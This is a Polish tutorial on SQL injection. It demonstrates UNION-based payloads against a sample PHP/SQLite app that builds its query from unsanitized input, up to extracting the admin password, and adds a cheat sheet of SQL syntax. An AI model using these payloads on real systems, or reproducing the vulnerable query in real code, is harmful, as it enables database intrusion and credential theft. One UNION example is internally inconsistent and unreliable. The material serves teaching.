# Atak SQL injection

Wszyscy znamy strony, które zawierają w sobie formularze czy przekazują w inny sposób wszelakie parametry. A co jeśli parametry te nie są prawidłowo przetworzone po stronie serwera i bezpośrednio trafiają do zapytań SQL?

## Przykład praktyczny

Weźmy na warsztat [przykładową aplikację]({{ data.repo_url }}/tree/master/examples/sqlinjection) wykorzystującą bazę danych SQLlite3.

Jest to prosta strona z formularzem, do którego jeśli podamy imię to zwróci nam czy jest ono śmieszne czy nie.

![Aplikacja PHP]({{ data.site_url }}/assets/images/web/sqlinjection/php_app.png)

Po wpisaniu imienia, jest ono wysyłane do serwera php w celu dalszej obróbki. Tak wygląda fragment kodu odpowiadający za zapytanie do bazy danych:

```php
$name = $_GET["name"];
$db = new SQLite3('example.db');
$query = "SELECT is_funny FROM funny as f, users as u JOIN users ON f.user_name=u.user_name WHERE u.user_name='$name'";
$result = @$db->query($query);
```

Po wpisaniu `admin` otrzymujemy wynik `not funny`. 

Na początek należy przeprowadzić weryfikację czy atak SQLi jest możliwy. Można to zrobić przez podanie `'` zamiast parametru.

![Aplikacja PHP - podatna?]({{ data.site_url }}/assets/images/web/sqlinjection/php_app_check.png)

Informacja ta mówi nam o tym, że jest to strona podatna na atak. Następnym krokiem będzie weryfikacja z jakim typem bazy danych mamy do czynienia. Można to zrobić przez sprawdzenie wersji oprogramowania - polecenie to różni się między dialektami

| Dialekt  | Polecenie  | 
|---|---|
| MySQL  | `SELECT @@version`  | 
| Oracle | `SELECT * FROM v$version`  |
| PostgreSQL | `SELECT version()`  | 
| Sqlite3 | `SELECT sqlite_version()` |

Wykonać to można przez manipulację poleceniem `UNION`, który łączy wyniki z dwóch lub więcej zapytań SQL w jedno. W tym przypadku będzie to 
```sql
admin' UNION SELECT sqlite_version(); --
```

Polecenie to zostanie po stronie serwera zamienione w:
```sql
SELECT is_funny FROM funny as f, users as u 
    JOIN users ON f.user_name=u.user_name 
    WHERE u.user_name='admin' 
UNION SELECT sqlite_version(); --'
```

![Aplikacja PHP - podatna?]({{ data.site_url }}/assets/images/web/sqlinjection/php_app_version.png)

Dzięki temu wiemy, że jest to baza Sqlite3. Następnym krokiem będzie ekstrakcja nazw tabel i kolumn. Zrobić to można poleceniem 
```sql
SELECT sql from sqlite_master; 
```
które w tym przypadku przybierze formę
```sql
admin' UNION SELECT sql from sqlite_master; --'
```

![Aplikacja PHP - kolumny]({{ data.site_url }}/assets/images/web/sqlinjection/php_app_columns.png)

Jako, że `UNION` wymaga takiej samej ilości kolumn w wyniku obu zapytań, dane z bazy będzie można wyciągać tylko pojedyńczo. Przykładowo hasło użytkownika `admin` pozyskamy stosując polecenie
```sql
admin' UNION SELECT password from users WHERE user_name = 'admin'; --'
```

![Aplikacja PHP - haslo]({{ data.site_url }}/assets/images/web/sqlinjection/php_app_password.png)

## Przydatne zapytania

### Komentarze

- `--`
- `#`
- `/**/`
- `/*! MYSQL Special SQL */` (**tylko w MySQL**)

### Instrukcja warunkowa `if`

#### MySQL

- `IF(warunek, wykonaj-jesli-prawda, wykonaj-jeśli-fałsz)`

#### PostgreSQL

- `SELECT CASE WHEN warunek THEN wykonaj-jesli-prawda ELSE wykonaj-jeśli-fałsz END;`

#### Oracle

- `BEGIN IF warunek THEN wykonaj-jesli-prawda; ELSE wykonaj-jeśli-fałsz; END IF; END;`

### Liczby szesnastkowe

Są one szczególnie przydatne w przypadku gdy jakieś znaki są zakazane.

- `56 == 0x38`

### Znaki i ciągi znaków

- `SELECT CHAR(0x41);` - zwróci znak ASCII o wartości szesnastkowej `0x41`
- `SELECT ASCII('a');` - zwróci wartość dziesiętną litery wysuniętej najbardziej na lewo w ciągu znaków
- `SELECT CONCAT(str1, str2, str3, ...);` - konkatencja stringów (**tylko MySQL**)
- `SELECT 'A' || 'B' || 'C';`  - konkatencja stringów; zwróci `ABC`

### Union

Unie są bardzo przydatne gdy potrzebujemy wyciągnąć dane z wielu tabel mając do dyspozycji tylko jedno zapytanie.

!!! warning "Uwaga"
    Unie wymagają takiej samej ilości kolumn w obu zapytaniach, które łączą

Wyobraźmy sobie dwie tabele: 

- `użytkownicy`

| id | nazwa | hasło|
| ------- | ------- | -------|
| 1 | admin | admin12345 |
| 2 | user | pass12345 | 

- `komputery`

|   id      | user_id |     model      |
| -------   | ------- |    -------     |
|   1       |     2   | Lenovo Yoga    |
|   2       |     1   | Dell Inspiron  | 

Do dyspozycji mamy tylko zapytanie
```sql
SELECT nazwa, id FROM użytkownicy;
```

Otrzymamy w ten sposób jedną listę rekordów z nazwami użytkowników i ich hasłami

| nazwa | hasło | 
| ----- | -- |
| admin | admin12345  |
| user  | pass12345  |

Aby wyświetlić dodatkowo zawartość kolumny `model` z tabeli `komputery` za pomocą unii należy wykonać polecenie
```sql
SELECT nazwa, id FROM użytkownicy UNION SELECT model, 1 FROM komputery;
```

Zauważmy, że wymuszone zostały tutaj stałe wartości `1` aby ilość kolumn w obu wyrażeniach `SELECT` połączonych unią się zgadzała. W ten sposób otrzymamy wynik:

| nazwa | hasło | 
| ----- | -- |
| admin | admin12345  |
| user  | pass12345  |
| Lenovo Yoga | 1 |
| Dell Inspiron | 1 |   

Graficznie wygląda to następująco

![UNION]({{ data.site_url }}/assets/images/web/sqlinjection/union_query.png)

### Join

`Join` łączy dane z dwóch zapytań w jedną tabelę. Każdy wiersz tabeli wynikowej zawiera elementy z obu zbiorów. Wykonany zostaje na tabelach tzw. *iloczyn kartezjański* czyli każdy element z jednej tabeli ma odwzorowanie w elementach drugiej tabeli.

Wyobraźmy sobie dwie tabele: 

- `użytkownicy`

| id | nazwa | hasło|
| ------- | ------- | -------|
| 1 | admin | admin12345 |
| 2 | user | pass12345 | 

- `komputery`

|   id      | user_id |     model      |
| -------   | ------- |    -------     |
|   1       |     2   | Lenovo Yoga    |
|   2       |     1   | Dell Inspiron  | 

Załóżmy, że chcemy zobaczyć komputery użytkownika `admin`. Możemy to osiągnać poleceniem:
```sql
SELECT * FROM użytkownicy AS u JOIN komputery AS k ON u.id = k.user_id;
```
W odpowiedzi otrzymamy:

| u.id | u.nazwa | u.hasło |   k.id      | k.user_id |     k.model      |
| ------- | ------- | ------- | -------   | ------- |    -------     |
| 1 | admin | admin12345 |   2       |     1   | Dell Inspiron  |

Graficznie wygląda to następująco

![JOIN]({{ data.site_url }}/assets/images/web/sqlinjection/join_query.png)

### Inne

!!! info 
    Więcej przykładów znaleźć można [tutaj](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/) lub [tutaj](https://portswigger.net/web-security/sql-injection/cheat-sheet)